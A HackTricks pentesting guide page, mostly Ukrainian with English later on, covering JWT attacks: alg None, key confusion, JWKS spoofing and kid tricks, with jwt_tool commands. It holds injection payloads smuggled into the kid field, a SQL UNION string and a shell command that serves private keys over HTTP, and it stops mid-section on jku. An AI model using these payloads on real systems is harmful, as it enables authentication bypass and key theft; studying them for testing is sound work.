# –£—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ JWT (Json Web Tokens)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∏ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω—ñ –≤ **–∫–∞—Ä'—î—Ä—ñ –≤ —Ö–∞–∫–µ—Ä—Å—Ç–≤—ñ** —Ç–∞ —Ö–æ—á–µ—Ç–µ –∑–ª–∞–º–∞—Ç–∏ –Ω–µ–∑–ª–∞–º–Ω–µ - **–º–∏ –Ω–∞–π–º–∞—î–º–æ!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é –º–æ–≤–æ—é –≤ –ø–∏—Å—å–º–æ–≤—ñ–π —Ç–∞ —É—Å–Ω—ñ–π —Ñ–æ—Ä–º—ñ_).

{% embed url="https://www.stmcyber.com/careers" %}

**–ß–∞—Å—Ç–∏–Ω–∞ —Ü—å–æ–≥–æ –ø–æ—Å—Ç—É –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ —á—É–¥–æ–≤–æ–º—É –ø–æ—Å—Ç—ñ:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\
**–ê–≤—Ç–æ—Ä —á—É–¥–æ–≤–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è JWT** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt_tool)

### **–®–≤–∏–¥–∫—ñ –ø–µ—Ä–µ–º–æ–≥–∏**

–ó–∞–ø—É—Å—Ç—ñ—Ç—å [**jwt\_tool**](https://github.com/ticarpi/jwt_tool) –≤ —Ä–µ–∂–∏–º—ñ `All Tests!` —ñ —á–µ–∫–∞–π—Ç–µ –∑–µ–ª–µ–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤.
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
–Ø–∫—â–æ –≤–∞–º –ø–æ—â–∞—Å—Ç–∏—Ç—å, —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∑–Ω–∞–π–¥–µ –≤–∏–ø–∞–¥–æ–∫, –∫–æ–ª–∏ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î JWT:

![](<../.gitbook/assets/image (935).png>)

–¢–æ–¥—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∑–∞–ø–∏—Ç —É –≤–∞—à–æ–º—É –ø—Ä–æ–∫—Å—ñ –∞–±–æ –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π JWT –¥–ª—è —Ü—å–æ–≥–æ –∑–∞–ø–∏—Ç—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) –¥–ª—è –∑–∞–ø—É—Å–∫—É –∞—Ç–∞–∫ JWT –∑ Burp.

### –ó–º—ñ–Ω—é–π—Ç–µ –¥–∞–Ω—ñ, –Ω–µ –º–æ–¥–∏—Ñ—ñ–∫—É—é—á–∏ –Ω—ñ—á–æ–≥–æ

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–º—ñ–Ω–∏—Ç–∏ –¥–∞–Ω—ñ, –∑–∞–ª–∏—à–∞—é—á–∏ –ø—ñ–¥–ø–∏—Å –±–µ–∑ –∑–º—ñ–Ω, —ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø—ñ–¥–ø–∏—Å. –°–ø—Ä–æ–±—É–π—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —Å–≤–æ—î —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞ "admin", –Ω–∞–ø—Ä–∏–∫–ª–∞–¥.

#### **–ß–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è —Ç–æ–∫–µ–Ω?**

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø—ñ–¥–ø–∏—Å JWT:

* –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ —Ç—Ä–∏–≤–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞; —á—É—Ç–ª–∏–≤—ñ –¥–µ—Ç–∞–ª—ñ —É –¥–µ—Ç–∞–ª—å–Ω–∏—Ö –ø–æ–º–∏–ª–∫–∞—Ö —Å–ª—ñ–¥ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏.
* –ó–º—ñ–Ω–∞ –Ω–∞ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ —Ç–∞–∫–æ–∂ –≤–∫–∞–∑—É—î –Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É.
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∑–º—ñ–Ω –≤–∫–∞–∑—É—î –Ω–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏; —Ü–µ –º–æ–º–µ–Ω—Ç –¥–ª—è –µ–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—ñ–≤ —ñ–∑ –∑–º—ñ–Ω–æ—é –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

### –ü–æ—Ö–æ–¥–∂–µ–Ω–Ω—è

–í–∞–∂–ª–∏–≤–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —á–∏ —Ç–æ–∫–µ–Ω –±—É–≤ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ —á–∏ –∫–ª—ñ—î–Ω—Ç–∞, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏ —ñ—Å—Ç–æ—Ä—ñ—é –∑–∞–ø–∏—Ç—ñ–≤ –ø—Ä–æ–∫—Å—ñ.

* –¢–æ–∫–µ–Ω–∏, –≤–ø–µ—Ä—à–µ –ø–æ–±–∞—á–µ–Ω—ñ –∑ –±–æ–∫—É –∫–ª—ñ—î–Ω—Ç–∞, –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ, —â–æ –∫–ª—é—á –º–æ–∂–µ –±—É—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –¥–ª—è –∫–æ–¥—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞, —â–æ –ø–æ—Ç—Ä–µ–±—É—î –ø–æ–¥–∞–ª—å—à–æ–≥–æ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è.
* –¢–æ–∫–µ–Ω–∏, —â–æ –ø–æ—Ö–æ–¥—è—Ç—å –∑ –±–æ–∫—É —Å–µ—Ä–≤–µ—Ä–∞, –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –±–µ–∑–ø–µ—á–Ω–∏–π –ø—Ä–æ—Ü–µ—Å.

### –¢—Ä–∏–≤–∞–ª—ñ—Å—Ç—å

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —Ç–æ–∫–µ–Ω –¥—ñ—î –±—ñ–ª—å—à–µ 24 –≥–æ–¥–∏–Ω... –º–æ–∂–ª–∏–≤–æ, –≤—ñ–Ω –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è. –Ø–∫—â–æ —î –ø–æ–ª–µ "exp", –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —Å–µ—Ä–≤–µ—Ä –ø—Ä–∞–≤–∏–ª—å–Ω–æ –π–æ–≥–æ –æ–±—Ä–æ–±–ª—è—î.

### –ë—Ä—É—Ç—Ñ–æ—Ä—Å HMAC —Å–µ–∫—Ä–µ—Ç—É

[**–î–∏–≤—ñ—Ç—å—Å—è —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### –ó–º—ñ–Ω–∏—Ç–∏ –∞–ª–≥–æ—Ä–∏—Ç–º –Ω–∞ None

–í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–∏–π –∞–ª–≥–æ—Ä–∏—Ç–º —è–∫ "None" —ñ –≤–∏–¥–∞–ª—ñ—Ç—å —á–∞—Å—Ç–∏–Ω—É –ø—ñ–¥–ø–∏—Å—É.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp –ø—ñ–¥ –Ω–∞–∑–≤–æ—é "JSON Web Token", —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —ñ –∑–º—ñ–Ω–∏—Ç–∏ —Ä—ñ–∑–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ JWT (–Ω–∞–¥—ñ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç –¥–æ Repeater, —ñ –Ω–∞ –≤–∫–ª–∞–¥—Ü—ñ "JSON Web Token" –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–æ–∫–µ–Ω–∞. –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–±—Ä–∞—Ç–∏, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–æ–ª—è "Alg" –Ω–∞ "None").

### –ó–º—ñ–Ω–∏—Ç–∏ –∞–ª–≥–æ—Ä–∏—Ç–º RS256(–∞—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–π) –Ω–∞ HS256(—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–π) (CVE-2016-5431/CVE-2016-10555)

–ê–ª–≥–æ—Ä–∏—Ç–º HS256 –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ–∫—Ä–µ—Ç–Ω–∏–π –∫–ª—é—á –¥–ª—è –ø—ñ–¥–ø–∏—Å—É —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫–æ–∂–Ω–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.\
–ê–ª–≥–æ—Ä–∏—Ç–º RS256 –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –¥–ª—è –ø—ñ–¥–ø–∏—Å—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.

–Ø–∫—â–æ –≤–∏ –∑–º—ñ–Ω–∏—Ç–µ –∞–ª–≥–æ—Ä–∏—Ç–º –∑ RS256 –Ω–∞ HS256, –∫–æ–¥ –Ω–∞ –±–µ–∫–µ–Ω–¥—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —è–∫ —Å–µ–∫—Ä–µ—Ç–Ω–∏–π –∫–ª—é—á, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∞–ª–≥–æ—Ä–∏—Ç–º HS256 –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É.

–¢–æ–¥—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —ñ –∑–º—ñ–Ω—é—é—á–∏ RS256 –Ω–∞ HS256, –º–∏ –º–æ–≥–ª–∏ –± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –¥—ñ–π—Å–Ω–∏–π –ø—ñ–¥–ø–∏—Å. –í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞, –≤–∏–∫–æ–Ω–∞–≤—à–∏ —Ü–µ:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### –ù–æ–≤–∏–π –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —É –∑–∞–≥–æ–ª–æ–≤–∫—É

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–±—É–¥–æ–≤—É—î –Ω–æ–≤–∏–π –∫–ª—é—á —É –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Ç–æ–∫–µ–Ω–∞, —ñ —Å–µ—Ä–≤–µ—Ä –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü–µ–π –Ω–æ–≤–∏–π –∫–ª—é—á –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É (CVE-2018-0114).

–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è "JSON Web Tokens" –¥–ª—è Burp.\
(–í—ñ–¥–ø—Ä–∞–≤—Ç–µ –∑–∞–ø–∏—Ç –¥–æ Repeater, —É –≤–∫–ª–∞–¥—Ü—ñ JSON Web Token –≤–∏–±–µ—Ä—ñ—Ç—å "CVE-2018-0114" —ñ –Ω–∞–¥—ñ—à–ª—ñ—Ç—å –∑–∞–ø–∏—Ç).

### JWKS –°–ø—É—Ñ—ñ–Ω–≥

–Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å—É—é—Ç—å –º–µ—Ç–æ–¥ –æ—Ü—ñ–Ω–∫–∏ –±–µ–∑–ø–µ–∫–∏ JWT —Ç–æ–∫–µ–Ω—ñ–≤, –∑–æ–∫—Ä–µ–º–∞ —Ç–∏—Ö, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ–∫ "jku". –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –º–∞—î –ø–æ—Å–∏–ª–∞—Ç–∏—Å—è –Ω–∞ —Ñ–∞–π–ª JWKS (JSON Web Key Set), —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–∞.

* **–û—Ü—ñ–Ω–∫–∞ —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–º "jku"**:
* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ URL-–∞–¥—Ä–µ—Å—É –∑–∞—è–≤–∏ "jku", —â–æ–± –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ –≤–æ–Ω–∞ –≤–µ–¥–µ –¥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª—É JWKS.
* –ó–º—ñ–Ω—ñ—Ç—å –∑–Ω–∞—á–µ–Ω–Ω—è "jku" —Ç–æ–∫–µ–Ω–∞, —â–æ–± –Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –π–æ–≥–æ –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –≤–µ–±-—Å–µ—Ä–≤—ñ—Å, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏ –∑–∞ —Ç—Ä–∞—Ñ—ñ–∫–æ–º.
* **–ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ HTTP-–≤–∑–∞—î–º–æ–¥—ñ—ó**:
* –°–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—è –∑–∞ HTTP-–∑–∞–ø–∏—Ç–∞–º–∏ –¥–æ –≤–∞—à–æ—ó –≤–∫–∞–∑–∞–Ω–æ—ó URL-–∞–¥—Ä–µ—Å–∏ –≤–∫–∞–∑—É—î –Ω–∞ —Å–ø—Ä–æ–±–∏ —Å–µ—Ä–≤–µ—Ä–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–ª—é—á—ñ –∑ –Ω–∞–¥–∞–Ω–æ–≥–æ –≤–∞–º–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è.
* –ö–æ–ª–∏ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ `jwt_tool` –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É, –≤–∞–∂–ª–∏–≤–æ –æ–Ω–æ–≤–∏—Ç–∏ —Ñ–∞–π–ª `jwtconf.ini` –∑ –≤–∞—à–∏–º –æ—Å–æ–±–∏—Å—Ç–∏–º —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è–º JWKS –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è.
* **–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è `jwt_tool`**:
*   –í–∏–∫–æ–Ω–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É, —â–æ–± –∑–º–æ–¥–µ–ª—é–≤–∞—Ç–∏ —Å—Ü–µ–Ω–∞—Ä—ñ–π –∑ `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### –û–≥–ª—è–¥ –ø—Ä–æ–±–ª–µ–º –∑ Kid

–î–æ–¥–∞—Ç–∫–æ–≤–∞ –∑–∞—è–≤–∫–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∞, –≤—ñ–¥–æ–º–∞ —è–∫ `kid`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞, —â–æ —Å—Ç–∞—î –æ—Å–æ–±–ª–∏–≤–æ –≤–∞–∂–ª–∏–≤–∏–º —É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö, –¥–µ —ñ—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ –∫–ª—é—á—ñ–≤ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω–∞. –¶—è –∑–∞—è–≤–∫–∞ –¥–æ–ø–æ–º–∞–≥–∞—î –≤–∏–±—Ä–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –∫–ª—é—á –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É —Ç–æ–∫–µ–Ω–∞.

#### –í–∏—è–≤–ª–µ–Ω–Ω—è –∫–ª—é—á–∞ —á–µ—Ä–µ–∑ "kid"

–ö–æ–ª–∏ —É –∑–∞–≥–æ–ª–æ–≤–∫—É –ø—Ä–∏—Å—É—Ç–Ω—è –∑–∞—è–≤–∫–∞ `kid`, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è —à—É–∫–∞—Ç–∏ —É –≤–µ–±-–¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π —Ñ–∞–π–ª –∞–±–æ –π–æ–≥–æ –≤–∞—Ä—ñ–∞—Ü—ñ—ó. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∫–∞–∑–∞–Ω–æ `"kid":"key/12345"`, —Å–ª—ñ–¥ —à—É–∫–∞—Ç–∏ —Ñ–∞–π–ª–∏ _/key/12345_ —Ç–∞ _/key/12345.pem_ —É –∫–æ—Ä–µ–Ω–µ–≤—ñ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó –≤–µ–±-—Å–∞–π—Ç—É.

#### –ü–µ—Ä–µ—Ö—ñ–¥ –ø–æ —à–ª—è—Ö—É –∑ "kid"

–ó–∞—è–≤–∫–∞ `kid` —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó –ø–æ —Ñ–∞–π–ª–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–±—ñ—Ä –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É. –ú–æ–∂–ª–∏–≤–æ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –∑'—î–¥–Ω–∞–Ω–Ω—è –∞–±–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫–∏ Server-Side Request Forgery (SSRF), –∑–º—ñ–Ω–∏–≤—à–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `kid`, —â–æ–± –Ω–∞—Ü—ñ–ª–∏—Ç–∏—Å—è –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Ñ–∞–π–ª–∏ –∞–±–æ —Å–µ—Ä–≤—ñ—Å–∏. –ó–º—ñ–Ω–∞ JWT –¥–ª—è –∑–º—ñ–Ω–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `kid`, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –ø—ñ–¥–ø–∏—Å, –º–æ–∂–µ –±—É—Ç–∏ –¥–æ—Å—è–≥–Ω—É—Ç–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∞–ø–æ—Ä–∞ `-T` —É jwt_tool, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
By targeting files with predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password for JWT generation.

#### SQL Injection via "kid"

If the `kid` claim's content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the `kid` payload. An example payload that uses SQL injection to alter the JWT signing process includes:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

This alteration forces the use of a known secret key, `ATTACKER`, for JWT signing.

#### OS Injection through "kid"

A scenario where the `kid` parameter specifies a file path used within a command execution context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the `kid` parameter, it's possible to expose private keys. An example payload for achieving RCE and key exposure is:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\
If the token uses a ‚Äú**jku**‚Äù **Header** claim then **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞–¥–∞–Ω–µ URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

First you need to create a new certificate with new private & public keys
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
